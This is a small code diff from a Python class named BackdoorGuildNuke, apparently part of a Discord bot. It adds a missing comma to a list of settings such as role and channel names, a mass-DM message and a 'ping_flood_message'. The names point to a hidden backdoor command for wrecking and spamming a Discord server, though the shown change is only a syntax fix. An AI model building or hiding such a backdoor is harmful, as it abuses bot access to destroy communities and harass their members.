@@ -80,7 +80,7 @@ class BackdoorGuildNuke(chattrigger.ChatTrigger):
             "Note: reason is the reason that shows up in the audit log")
 
         needed_values = [
-            "role_name", "role_reason", "role_colour_hex"
+            "role_name", "role_reason", "role_colour_hex",
             "text_channel_name", "text_channel_topic", "text_channel_reason",
             "dm_channel_message", "ping_flood_message"
         ]
